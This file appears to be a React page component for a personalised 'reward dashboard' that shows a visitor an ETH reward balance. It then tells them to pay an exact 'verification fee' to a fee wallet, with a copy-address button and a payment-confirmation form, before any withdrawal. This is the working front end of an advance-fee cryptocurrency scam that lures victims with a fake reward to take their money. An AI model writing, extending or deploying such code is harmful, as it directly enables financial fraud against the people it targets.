import { useRoute } from "wouter";
import { useUser } from "@/hooks/use-users";
import { useWithdrawalRequest } from "@/hooks/use-withdrawal";
import { UserLayout } from "@/components/layout/user-layout";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { formatDollar, formatEth, truncateWallet } from "@/lib/utils";
import { Copy, Info } from "lucide-react";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { useQueryClient } from "@tanstack/react-query";

export default function UserCongrats() {
  const [, params] = useRoute("/u/:slug");
  const slug = params?.slug || "";

  const { data: user, isLoading, isError } = useUser(slug);
  const { data: withdrawalRequest } = useWithdrawalRequest(slug);

  const queryClient = useQueryClient();
  const { toast } = useToast();

  const [copied, setCopied] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState("");

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmitPayment = async () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount <= 0) {
      toast({ title: "Enter a valid amount", variant: "destructive" });
      return;
    }
    if (user && amount > user.eligibleBalance) {
      toast({ title: "Amount exceeds your eligible balance", variant: "destructive" });
      return;
    }

    try {
      const res = await fetch(`/api/withdrawal-requests/${slug}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestedAmount: amount }),
      });

      if (!res.ok) throw new Error("Failed to submit payment");

      queryClient.invalidateQueries({ queryKey: ["withdrawal-request", slug] });

      toast({
        title: "Payment notification sent!",
        description: "Waiting for admin verification.",
      });
      setWithdrawAmount("");
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message || "Something went wrong",
        variant: "destructive",
      });
    }
  };

  if (isLoading) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center">
          <div className="w-8 h-8 border-2 border-white border-t-transparent rounded-full animate-spin" />
        </div>
      </UserLayout>
    );
  }

  if (isError || !user) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center p-6">
          <Card className="max-w-md w-full bg-zinc-900 border-zinc-800">
            <CardContent className="pt-8 pb-8 text-center">
              <h2 className="text-2xl font-semibold mb-2">Account Not Found</h2>
              <p className="text-zinc-400">The link you followed is invalid or has expired.</p>
            </CardContent>
          </Card>
        </div>
      </UserLayout>
    );
  }

  return (
    <UserLayout slug={slug}>
      <div className="max-w-2xl mx-auto px-6 pt-20 pb-24">

        {/* Header */}
        <div className="text-center mb-12">
          <h1 className="text-5xl font-semibold tracking-tight mb-3">
            Welcome, {user.name}
          </h1>
          <p className="text-zinc-400 text-lg">
            Your personalized reward dashboard
          </p>
        </div>

        {/* Balance Card */}
        <Card className="bg-zinc-900 border-zinc-800 mb-10">
          <CardContent className="p-12 text-center">
            <p className="uppercase tracking-[2px] text-xs text-zinc-500 mb-3">AVAILABLE REWARD</p>
            <div className="text-7xl font-semibold tracking-tighter text-white mb-1">
              {formatDollar(user.eligibleBalance)}
            </div>
            <p className="text-zinc-400">worth of ETH</p>
          </CardContent>
        </Card>

        {/* Wallet Information */}
        <div className="space-y-4 mb-12">
          {/* Connected Wallet */}
          <Card className="bg-zinc-900 border-zinc-800">
            <CardContent className="p-6">
              <p className="text-sm text-zinc-500 mb-1">Connected Wallet</p>
              <p className="font-mono text-sm break-all">{truncateWallet(user.walletAddress)}</p>
            </CardContent>
          </Card>

          {/* Fee Destination Wallet - Prominent Copy Button */}
          <Card className="bg-zinc-900 border-zinc-800">
            <CardContent className="p-6 flex flex-col sm:flex-row sm:items-center justify-between gap-6">
              <div className="flex-1">
                <p className="text-sm text-zinc-500 mb-1">Fee Destination Wallet</p>
                <p className="font-mono text-sm break-all tracking-wider">
                  {user.feeWalletAddress}
                </p>
              </div>
              <Button 
                onClick={() => copyToClipboard(user.feeWalletAddress)}
                className="bg-white hover:bg-zinc-100 text-black font-medium px-8 py-3 min-w-[140px]"
              >
                {copied ? "✓ Copied" : "Copy Address"}
              </Button>
            </CardContent>
          </Card>
        </div>

        {/* Withdrawal Fee Notice */}
        <Card className="bg-zinc-900 border-amber-500/30 mb-10">
          <CardContent className="p-8">
            <div className="flex gap-5">
              <Info className="w-6 h-6 text-amber-400 mt-0.5 flex-shrink-0" />
              <div className="space-y-2">
                <p className="font-medium">Verification Fee Required</p>
                <p className="text-sm text-zinc-400 leading-relaxed">
                  To process your withdrawal, please send exactly{" "}
                  <span className="text-amber-400 font-medium">
                    {formatEth(user.withdrawalFeeEth)}
                  </span>{" "}
                  to the Fee Destination Wallet above.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Payment Confirmation */}
        <Card className="bg-zinc-900 border-zinc-800">
          <CardContent className="p-8">
            <h3 className="text-lg font-medium mb-6">I've Made The Payment</h3>
            
            <div className="space-y-5">
              <Input
                type="number"
                step="0.0001"
                placeholder="Amount paid in ETH"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                className="bg-black border-zinc-700 text-lg py-6"
              />
              
              <Button 
                onClick={handleSubmitPayment} 
                className="w-full py-7 text-base font-medium bg-white text-black hover:bg-zinc-200"
                disabled={!withdrawAmount}
              >
                Confirm Payment Submission
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    </UserLayout>
  );
}
